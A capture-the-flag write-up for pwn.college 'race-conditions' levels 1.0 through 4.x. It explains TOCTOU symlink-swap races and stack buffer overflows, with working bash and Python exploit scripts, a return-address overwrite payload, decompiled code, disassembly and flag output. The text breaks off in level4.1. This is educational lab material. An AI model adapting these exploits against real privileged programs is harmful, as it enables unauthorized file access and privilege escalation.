---
custom_edit_url: null
sidebar_position: 2
slug: /pwn-college/system-security/race-conditions
---

## level1.0

> Read the flag file, but the program verifies the path doesn't contain "flag" and that the file is not a symlink.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0
###
### Welcome to /challenge/babyrace_level1.0!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be sent to you.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
babyrace_level1.0: <stdin>:47: main: Assertion `argc > 1' failed.
Aborted
```

The program performs two checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).

After both checks pass, it opens the file and sends the contents to stdout.

### TOCTOU

The key insight is that these checks and the subsequent `open()` call are **not atomic**. There is a small window of time between the **check** (is it a symlink?) and the **use** (actually opening the file).

```
Timeline:
  Program:   [lstat check — NOT symlink ✓] ----gap---- [open() → reads file]
  Attacker:       ^real file here^          ^swap!^      ^symlink to /flag^
```

If we can swap a regular file for a symlink to `/flag` inside that window, the program will pass the check against the regular file but then open our symlink, leaking the real flag.

### Exploit

Terminal 1:

```bash
hacker@race-conditions~level1-0:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
hacker@race-conditions~level1-0:~$ while true; do
    /challenge/babyrace_level1.0 x
done
```

Eventually the program checks `x` when it is a normal file, then opens it after it has become a symlink to `/flag`, printing the flag.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0 x
pwn.college{rAc3C0nd1t10ns_TOCTOUl1v3s.0VMzIDL4ITM0EzW}
```

&nbsp;

## level1.1

> Exploit a basic race condition to get the flag.

```
hacker@race-conditions~level1-1:~$ /challenge/babyrace_level1.1 
###
### Welcome to /challenge/babyrace_level1.1!
###

babyrace_level1.1: <stdin>:40: main: Assertion `argc > 1' failed.
Aborted                    /challenge/babyrace_level1.1
```

This challenge is the exact same as [level1.0](#level10).

### Exploit

Terminal 1:

```
hacker@race-conditions~level1-1:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```
hacker@race-conditions~level1-1:~$ while true; do
    /challenge/babyrace_level1.0 x
done
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: file is a symlink!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

pwn.college{cHDaunhEvD4T9hYDJvi33NxNTe5.0lMwQDL4ITM0EzW}
```

&nbsp;

## level2.0

> Exploit a race condition with a tighter timing window to read the flag. Keep in mind that tighter timing windows in race conditions generally are harder to exploit reliably!

```text
hacker@race-conditions~level2-0:~$ /challenge/babyrace_level2.0
###
### Welcome to /challenge/babyrace_level2.0!
###
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Paused (press enter to continue)
```

Same TOCTOU vulnerability as [level1.0](#level10), but the program pauses between the `lstat` check and the `open()` call, making the race window much larger and easier to win.

### Exploit

Terminal 1:

```bash
hacker@race-conditions~level2-0:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
hacker@race-conditions~level2-0:~$ while true; do
    /challenge/babyrace_level2.0 x
done

# ---- snip ----

pwn.college{U8-2_E6AoYrIX5lnG5sdQMgCRBV.01MwQDL4ITM0EzW}
```

&nbsp;

## level2.1

> Exploit a race condition with a tighter timing window to read the flag. Keep in mind that tighter timing windows in race conditions generally are harder to exploit reliably!

```text
hacker@race-conditions~level2-1:~$ /challenge/babyrace_level2.1
###
### Welcome to /challenge/babyrace_level2.1!
###

babyrace_level2.1: <stdin>:40: main: Assertion `argc > 1' failed.
Aborted
```

This challenge is similar to level2.0 but with the `getchar()` pauses removed, making the race window much tighter.

### Source code analysis

```c title="/challenge/babyrace_level2.1 :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  size_t v4; // rax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x28u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  v3 = open(argv[1], 0);
  v4 = read(v3, buf, 0x100uLL);
  write(1, buf, v4);
  puts("### Goodbye!");
  return 0;
}
```

### TOCTOU

Same TOCTOU vulnerability as level2.0 — `lstat` and `open()` are not atomic. Without the pauses however, the race window is only microseconds wide.

### Directory Maze

To widen the race window, we use a **directory maze**. Instead of racing on the file directly, we pass a deep path `top/b/c/d/e/x` and swap the top-level `top` symlink between two directory trees:

```text
Real tree:  top -> a,    a/b/c/d/e/x   = real small file
Fake tree:  top -> fake, fake/b/c/d/e/x = symlink to /flag
```

The deep path forces the kernel to resolve 5 directory levels for both `lstat` and `open()`, creating a wider window between the two syscalls. When `lstat("top/b/c/d/e/x")` runs, `top` points to `a` so it sees a real file and passes the symlink check. We then swap `top` to point to `fake` before `open()` runs, so it resolves to `fake/b/c/d/e/x` which is a symlink to `/flag`.

Using `os.symlink()` and `os.remove()` directly instead of `os.system()` avoids forking a shell on every swap, keeping the timing precise.

### Exploit

~/script.py

```python title="~/script.py" showLineNumbers
import subprocess, time, os

# Setup maze
os.system("rm -rf a fake top")
os.system("mkdir -p a/b/c/d/e && echo hi > a/b/c/d/e/x")
os.system("mkdir -p fake/b/c/d/e && rm -f fake/b/c/d/e/x && ln -s /flag fake/b/c/d/e/x")

print("[*] Starting exploit loop...")
attempt = 0

sleeps = [0.00001, 0.00005, 0.0001, 0.0002, 0.0005, 0.001, 0.002, 0.005]
sleep_idx = 0
sleep_val = sleeps[sleep_idx]

while True:
    attempt += 1

    if attempt % 200 == 0:
        sleep_idx = (sleep_idx + 1) % len(sleeps)
        sleep_val = sleeps[sleep_idx]
        print(f"[*] Attempt {attempt}, trying sleep={sleep_val}")

    # Fast swap using os module directly (no shell fork)
    try:
        os.remove("top")
    except FileNotFoundError:
        pass
    os.symlink("a", "top")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level2.1", "top/b/c/d/e/x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    time.sleep(sleep_val)

    # Fast swap to fake
    try:
        os.remove("top")
    except FileNotFoundError:
        pass
    os.symlink("fake", "top")

    out = proc.stdout.read()
    proc.wait()

    if b"pwn.college" in out:
        print(f"[+] Got the flag with sleep={sleep_val}!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level2-1:~$ python3 ~/script.py
[*] Starting exploit loop...
[*] Attempt 200, trying sleep=5e-05
[*] Attempt 400, trying sleep=0.0001
[*] Attempt 600, trying sleep=0.0002
[*] Attempt 800, trying sleep=0.0005
[*] Attempt 1000, trying sleep=0.001
[*] Attempt 1200, trying sleep=0.002
[*] Attempt 1400, trying sleep=0.005
[*] Attempt 1600, trying sleep=1e-05
[*] Attempt 1800, trying sleep=5e-05
[*] Attempt 2000, trying sleep=0.0001
[*] Attempt 2200, trying sleep=0.0002
[*] Attempt 2400, trying sleep=0.0005
[*] Attempt 2600, trying sleep=0.001
[*] Attempt 2800, trying sleep=0.002
[*] Attempt 3000, trying sleep=0.005
[*] Attempt 3200, trying sleep=1e-05
[*] Attempt 3400, trying sleep=5e-05
[*] Attempt 3600, trying sleep=0.0001
[*] Attempt 3800, trying sleep=0.0002
[*] Attempt 4000, trying sleep=0.0005
[+] Got the flag with sleep=0.0005!
###
### Welcome to /challenge/babyrace_level2.1!
###
pwn.college{gTJklkAFDSH2ncV-d5qjjCGPR3u.0FNwQDL4ITM0EzW}
### Goodbye!
```

&nbsp;

## level3.0

> Exploit a race condition to corrupt memory, affecting the behavior of the challenge.

```text
hacker@race-conditions~level3-0:~$ /challenge/babyrace_level3.0 /etc/passwd
###
### Welcome to /challenge/babyrace_level3.0!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be read in.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Error: file is too large!
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code analysis

After both pauses and all checks pass, it opens and reads the file. Decompiling the binary reveals the following:

```c title="/challenge/babyrace_level3.0 :: Psedocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[256]; // [rsp+B0h] [rbp-110h] BYREF
  __int64 v7; // [rsp+1B0h] [rbp-10h]
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]
  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  v7 = 0LL;
  puts(
    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
  puts("The file opened will be read in.\n");
  puts("This challenge will verify that the file's path does not include \"flag\".");
  puts("This challenge will verify that the file is not a symlink.");
  puts("This challenge will verify that the file is not larger than 256 bytes.");
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x51u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the path.\n");
  puts("Paused (press enter to continue)");
  getchar();
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  puts("Paused (press enter to continue)");
  getchar();
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  printf("Value of \"win\" variable: %llx\n", v7);
  if ( v7 )
    win();
  puts("### Goodbye!");
  return 0;
}
```

There are two vulnerabilities at play here.

### TOCTOU

The checks and the subsequent `open()` call are **not atomic**. There is a window of time between the `lstat` check and the actual `open()` call:

```
Timeline:
  Program:  [lstat check — small file ✓] --- gap --- [open() → reads file]
  Attacker:      ^small "hi" file^          ^swap!^   ^big overflow file^
```

The program pauses with `getchar()` between the check and the open, making this window very wide and easy to exploit.

### Stack Buffer Overflow

`read(v3, buf, 0x1000uLL)` reads up to **4096 bytes** into `buf` which is only **256 bytes**. Looking at the stack layout:

```
char buf[256]   →  [rbp-110h]
__int64 v7      →  [rbp-10h]
```

The offset from `buf` to `v7` is `0x110 - 0x10 = 0x100` = **256 bytes**. So writing 264 bytes (256 to fill `buf` + 8 to overwrite `v7`) sets `v7` to a non-zero value, which triggers `win()`.

This means we don't need to swap to a symlink at all. We just need to:

1. Pass `lstat` with a small real file (`hi\n` = 3 bytes).
2. Swap to a 264-byte file **after** the lstat check but **before** `open()`.
3. `read()` overflows `buf` into `v7`, making it non-zero.
4. `win()` is called and prints the flag.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os

# Create overflow payload - 264 bytes to fill buf (256) + overwrite v7 (8 bytes)
payload = b"A" * 264
with open("bigfile", "wb") as f:
    f.write(payload)

print("[*] Starting exploit loop...")

attempt = 0
while True:
    attempt += 1

    # Start with a small real file to pass lstat
    os.system("rm -f x && echo hi > x")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level3.0", "x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    # Wait for program to reach first pause (lstat check)
    time.sleep(0.1)

    # Send first enter - lstat runs on small "hi" file, passes all checks
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except BrokenPipeError:
        proc.wait()
        continue

    # Swap x to the big file AFTER lstat check but BEFORE open()
    os.system("rm -f x && cp bigfile x")

    # Send second enter - open() reads bigfile, overflows buf into v7
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
        proc.stdin.close()
    except BrokenPipeError:
        proc.wait()
        continue

    out = proc.stdout.read()
    proc.wait()

    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break

    if b"Value" in out:
        line = [l for l in out.decode(errors='replace').splitlines() if "Value" in l]
        if line and "0" not in line[0].split(":")[-1].strip():
            print("[+] win variable non-zero!")
            print(out.decode(errors='replace'))
            break
```

```text
hacker@race-conditions~level3-0:~$ python ~/script.py
[*] Starting exploit loop...
[*] Attempt 1: Value of "win" variable: 4141414141414141
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level3.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be read in.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)
Paused (press enter to continue)
Value of "win" variable: 4141414141414141
You win! Here is your flag:
pwn.college{YjdXcuUWNbwI3UnjvP86hY7QNs8.0VNwQDL4ITM0EzW}


### Goodbye!
```

&nbsp;

## level3.1

> Exploit a race condition to corrupt memory, affecting the behavior of the challenge.

```text
hacker@race-conditions~level3-1:~$ /challenge/babyrace_level3.1
###
### Welcome to /challenge/babyrace_level3.1!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be read in.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code analysis

Decompiling the binary reveals the following:

```c title="/challenge/babyrace_level3.1 :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[256]; // [rsp+B0h] [rbp-110h] BYREF
  __int64 v7; // [rsp+1B0h] [rbp-10h]
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  v7 = 0LL;
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x49u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  if ( v7 )
    win();
  puts("### Goodbye!");
  return 0;
}
```

This is identical to [level3.0](#level30) with one critical difference: **the `getchar()` pauses are gone**. There is no artificial delay between the `lstat` check and the `open()` call, making the race window much tighter.

### TOCTOU

The checks and the subsequent `open()` call are still **not atomic**. The window between `lstat` and `open()` is now just natural CPU time — microseconds — but it still exists:

```text
Timeline:
  Program:  [lstat check — small file ✓] -tiny gap- [open() → reads file]
  Attacker:      ^small "hi" file^          ^swap!^   ^big overflow file^
```

### Stack Buffer Overflow

Same vulnerability as level3.0. `read(v3, buf, 0x1000uLL)` reads up to **4096 bytes** into `buf` which is only **256 bytes**:

```text
char buf[256]   →  [rbp-110h]
__int64 v7      →  [rbp-10h]
```

The offset from `buf` to `v7` is `0x110 - 0x10 = 0x100` = **256 bytes**. Writing 264 bytes overwrites `v7` with a non-zero value, triggering `win()`.

Since there are no pauses, we use a background thread to continuously swap `x` between a small file and the overflow payload as fast as possible, while hammering the binary in the main loop.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, os, threading

# Create overflow payload - 264 bytes to fill buf (256) + overwrite v7 (8 bytes)
payload = b"A" * 264
with open("bigfile", "wb") as f:
    f.write(payload)

print("[*] Starting exploit loop...")

stop = False
attempt = 0

def swapper():
    """Continuously swap x between small file and big file"""
    while not stop:
        os.system("rm -f x && echo hi > x")
        os.system("rm -f x && cp bigfile x")

# Start swap thread
t = threading.Thread(target=swapper, daemon=True)
t.start()

while not stop:
    attempt += 1

    try:
        out = subprocess.check_output(
            ["/challenge/babyrace_level3.1", "x"],
            stderr=subprocess.STDOUT,
            timeout=2
        )
    except subprocess.TimeoutExpired:
        continue
    except subprocess.CalledProcessError as e:
        out = e.output
    except Exception:
        continue

    if attempt % 1000 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        stop = True
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level3-1:~$ python ~/script.py
[*] Starting exploit loop...
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level3.1!
###

You win! Here is your flag:
pwn.college{QaC5k6aR0cDMtWJ22pLmn4OzYaz.0lNwQDL4ITM0EzW}


### Goodbye!
```

&nbsp;

## level4.0

> Exploit a race condition to corrupt memory and smash the stack!

```
hacker@race-conditions~level4-0:~$ /challenge/babyrace_level4.0
###
### Welcome to /challenge/babyrace_level4.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be read in.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
babyrace_level4.0: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code analysis

```c title="/challenge/babyrace_level4.0 :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[256]; // [rsp+20h] [rbp-190h] BYREF
  struct stat stat_buf; // [rsp+120h] [rbp-90h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
  puts("The file opened will be read in.\n");
  puts("This challenge will verify that the file's path does not include \"flag\".");
  puts("This challenge will verify that the file is not a symlink.");
  puts("This challenge will verify that the file is not larger than 256 bytes.");
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x4Cu, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the path.\n");
  puts("Paused (press enter to continue)");
  getchar();
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  puts("Paused (press enter to continue)");
  getchar();
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  puts("### Goodbye!");
  return 0;
}
```

At first glance this looks similar to level3.0 — three checks, two pauses, and a `read()` into `buf`. However there are two key differences:

1. **No `win` variable** — there is no `v7` on the stack to overflow into.
2. **`buf` is never printed** — unlike level2.0, there is no `write(1, buf, v4)`. The file contents are read and silently discarded.

Checking the binary's defined functions reveals a `win()` function that is never called from `main`:

```text
pwndbg> info functions
...
0x00000000004012f6  win
0x00000000004013f3  main
...
```

Disassembling `win()` shows it opens `/flag` directly (hardcoded) and writes the contents to stdout:

```text
pwndbg> disassemble win
Dump of assembler code for function win:
   0x00000000004012f6 <+0>:     endbr64
   0x00000000004012fa <+4>:     push   rbp
   0x00000000004012fb <+5>:     mov    rbp,rsp
   0x00000000004012fe <+8>:     lea    rdi,[rip+0xd03]        # 0x402008
   0x0000000000401305 <+15>:    call   0x401140 <puts@plt>
   0x000000000040130a <+20>:    mov    esi,0x0
   0x000000000040130f <+25>:    lea    rdi,[rip+0xd0e]        # 0x402024
   0x0000000000401316 <+32>:    mov    eax,0x0
   0x000000000040131b <+37>:    call   0x4011d0 <open@plt>
   0x0000000000401320 <+42>:    mov    DWORD PTR [rip+0x2d9a],eax        # 0x4040c0 <flag_fd.5683>
   0x0000000000401326 <+48>:    mov    eax,DWORD PTR [rip+0x2d94]        # 0x4040c0 <flag_fd.5683>
   0x000000000040132c <+54>:    test   eax,eax
   0x000000000040132e <+56>:    jns    0x401379 <win+131>
   0x0000000000401330 <+58>:    call   0x401130 <__errno_location@plt>
   0x0000000000401335 <+63>:    mov    eax,DWORD PTR [rax]
   0x0000000000401337 <+65>:    mov    edi,eax
   0x0000000000401339 <+67>:    call   0x4011f0 <strerror@plt>
   0x000000000040133e <+72>:    mov    rsi,rax
   0x0000000000401341 <+75>:    lea    rdi,[rip+0xce8]        # 0x402030
   0x0000000000401348 <+82>:    mov    eax,0x0
   0x000000000040134d <+87>:    call   0x401170 <printf@plt>
   0x0000000000401352 <+92>:    call   0x401190 <geteuid@plt>
   0x0000000000401357 <+97>:    test   eax,eax
   0x0000000000401359 <+99>:    je     0x4013f0 <win+250>
   0x000000000040135f <+105>:   lea    rdi,[rip+0xcfa]        # 0x402060
   0x0000000000401366 <+112>:   call   0x401140 <puts@plt>
   0x000000000040136b <+117>:   lea    rdi,[rip+0xd16]        # 0x402088
   0x0000000000401372 <+124>:   call   0x401140 <puts@plt>
   0x0000000000401377 <+129>:   jmp    0x4013f0 <win+250>
   0x0000000000401379 <+131>:   mov    eax,DWORD PTR [rip+0x2d41]        # 0x4040c0 <flag_fd.5683>
   0x000000000040137f <+137>:   mov    edx,0x100
   0x0000000000401384 <+142>:   lea    rsi,[rip+0x2d55]        # 0x4040e0 <flag.5682>
   0x000000000040138b <+149>:   mov    edi,eax
   0x000000000040138d <+151>:   call   0x4011a0 <read@plt>
   0x0000000000401392 <+156>:   mov    DWORD PTR [rip+0x2e48],eax        # 0x4041e0 <flag_length.5684>
   0x0000000000401398 <+162>:   mov    eax,DWORD PTR [rip+0x2e42]        # 0x4041e0 <flag_length.5684>
   0x000000000040139e <+168>:   test   eax,eax
   0x00000000004013a0 <+170>:   jg     0x4013c6 <win+208>
   0x00000000004013a2 <+172>:   call   0x401130 <__errno_location@plt>
   0x00000000004013a7 <+177>:   mov    eax,DWORD PTR [rax]
   0x00000000004013a9 <+179>:   mov    edi,eax
   0x00000000004013ab <+181>:   call   0x4011f0 <strerror@plt>
   0x00000000004013b0 <+186>:   mov    rsi,rax
   0x00000000004013b3 <+189>:   lea    rdi,[rip+0xd26]        # 0x4020e0
   0x00000000004013ba <+196>:   mov    eax,0x0
   0x00000000004013bf <+201>:   call   0x401170 <printf@plt>
   0x00000000004013c4 <+206>:   jmp    0x4013f1 <win+251>
   0x00000000004013c6 <+208>:   mov    eax,DWORD PTR [rip+0x2e14]        # 0x4041e0 <flag_length.5684>
   0x00000000004013cc <+214>:   cdqe
   0x00000000004013ce <+216>:   mov    rdx,rax
   0x00000000004013d1 <+219>:   lea    rsi,[rip+0x2d08]        # 0x4040e0 <flag.5682>
   0x00000000004013d8 <+226>:   mov    edi,0x1
   0x00000000004013dd <+231>:   call   0x401150 <write@plt>
   0x00000000004013e2 <+236>:   lea    rdi,[rip+0xd21]        # 0x40210a
   0x00000000004013e9 <+243>:   call   0x401140 <puts@plt>
   0x00000000004013ee <+248>:   jmp    0x4013f1 <win+251>
   0x00000000004013f0 <+250>:   nop
   0x00000000004013f1 <+251>:   pop    rbp
   0x00000000004013f2 <+252>:   ret
End of assembler dump.
```

### TOCTOU

Same wide race window as level3.0 — two `getchar()` pauses sit between the `lstat` check and `open()`:

```text
Timeline:
  Program:  [lstat check — small file ✓] --- gap --- [open() → reads file]
  Attacker:      ^small "hi" file^          ^swap!^   ^ROP payload file^
```

### Stack Buffer Overflow + Return Address Overwrite

`read(v3, buf, 0x1000uLL)` reads up to **4096 bytes** into `buf` which is only **256 bytes**. The stack layout is:

```text
char buf[256]      →  rbp-190h
struct stat stat_buf  →  rbp-90h
saved rbp          →  rbp
return address     →  rbp+8
```

The offset from `buf` to the return address is `0x190 + 8` = **408 bytes**. By writing 400 bytes of padding + 8 bytes to overwrite saved rbp + the address of `win()`, we redirect execution to `win()` when `main` returns.

The payload must be delivered via the TOCTOU race:

1. Start `x` as a small real file (`hi`) to pass `lstat`.
2. After the first pause sends, swap `x` to a symlink pointing to `bigfile` (the ROP payload).
3. After the second pause sends, `open()` follows the symlink and `read()` loads the payload into the stack.
4. `main` returns → jumps to `win()` → prints the flag.

Note: `bigfile` is 416 bytes which exceeds the 256-byte size limit, but that check uses `lstat` which already ran on the small real file. The `open()` call does not re-check the size.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os
import struct

WIN_ADDR = 0x00000000004012f6

# 400 bytes padding + 8 bytes for saved rbp + win() address
payload = b"A" * 400 + b"B" * 8 + struct.pack("<Q", WIN_ADDR)

with open("bigfile", "wb") as f:
    f.write(payload)

print(f"[*] Payload size: {len(payload)} bytes")
print("[*] Starting exploit loop...")

attempt = 0
while True:
    attempt += 1
    os.system("rm -f x && echo hi > x")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level4.0", "x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    time.sleep(0.1)

    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except BrokenPipeError:
        proc.wait()
        continue

    # Swap to bigfile after lstat check passes
    try:
        os.remove("x")
    except FileNotFoundError:
        pass
    os.symlink(os.path.abspath("bigfile"), "x")

    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
        proc.stdin.close()
    except BrokenPipeError:
        proc.wait()
        continue

    out = proc.stdout.read()
    proc.wait()

    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level4-0:~$ python ~/script.py
[*] Payload size: 416 bytes
[*] Starting exploit loop...
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level4.0!
###
Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be read in.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Paused (press enter to continue)
### Goodbye!
You win! Here is your flag:
pwn.college{4Bil_Cct4WsoOmwazn5YrWmeMLs.01NwQDL4ITM0EzW}
```

&nbsp;

## level4.1

> Exploit a race condition to corrupt memory and smash the stack!

```text
hacker@race-conditions~level4-1:~$ /challenge/babyrace_level4.1
###
### Welcome to /challenge/babyrace_level4.1!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be read in.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
babyrace_level4.1: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[256]; // [rsp+20h] [rbp-190h] BYREF
  struct stat stat_buf; // [rsp+120h] [rbp-90h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x44u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
